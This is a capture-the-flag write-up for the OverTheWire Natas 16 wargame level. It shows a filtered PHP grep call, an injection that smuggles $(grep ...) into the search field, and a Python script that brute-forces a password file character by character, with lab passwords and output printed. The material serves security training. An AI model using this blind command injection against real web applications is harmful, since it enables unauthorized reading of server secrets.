# Natas Level 15 --> Level 16

**Username:** natas16

**Password:** WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

**URL:**      http://natas16.natas.labs.overthewire.org

 
## Solution
* Click view sourcecode there you can see the filter used in the key-value, so we need to inject an OS command that bypasses this filter to get the password.
```
if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
```
* We can inject command inside double quotes with ***$(command)***, try to submit this
```
$(echo a)
```
* Now grep any word in the list to test like (Africans), and submit this 
```
Africans$(echo a)
```
* This (according to  Linux command) will result in 'Africansa' which isn't in the dictionary.txt so nothing will retrieve.
* According to the above idea we can submit 'Africans$(grep {char} /etc/natas_webpass/natas17)' which has two condition according to the char
> first -> return 'Africans(pass from natas17)' if this char in the file (return nothing in HTML)
> 
> second -> return 'Africans' if this char doesn't exist in the file (return 'Africans' in HTML as this word exist in dictionary.txt)
> 
> **We add ^ before the char to make sure that this character is the 1st character in the word**
* So we can perform brute-force to retrieve the password using boolean based injection using this python script:
```py
import requests
import string

chars = string.ascii_uppercase + string.ascii_lowercase + '0123456789'
base_url = 'http://natas16.natas.labs.overthewire.org/?needle='
password = ''

for i in range(32):
    cnt = 0
    while True:
        payload = password + chars[cnt]
        r = requests.get(base_url+f'Africans$(grep ^{payload} /etc/natas_webpass/natas17)', auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
        cnt += 1

        if not 'Africans' in r.text:
            password = payload
            print(password)
            break
```
> Execution Result
```py
8
8P
8Ps
8Ps3
8Ps3H
8Ps3H0
8Ps3H0G
8Ps3H0GW
8Ps3H0GWb
8Ps3H0GWbn
8Ps3H0GWbn5
8Ps3H0GWbn5r
8Ps3H0GWbn5rd
8Ps3H0GWbn5rd9
8Ps3H0GWbn5rd9S
8Ps3H0GWbn5rd9S7
8Ps3H0GWbn5rd9S7G
8Ps3H0GWbn5rd9S7Gm
8Ps3H0GWbn5rd9S7GmA
8Ps3H0GWbn5rd9S7GmAd
8Ps3H0GWbn5rd9S7GmAdg
8Ps3H0GWbn5rd9S7GmAdgQ
8Ps3H0GWbn5rd9S7GmAdgQN
8Ps3H0GWbn5rd9S7GmAdgQNd
8Ps3H0GWbn5rd9S7GmAdgQNdk
8Ps3H0GWbn5rd9S7GmAdgQNdkh
8Ps3H0GWbn5rd9S7GmAdgQNdkhP
8Ps3H0GWbn5rd9S7GmAdgQNdkhPk
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9c
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```
** You got the password!!

> 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
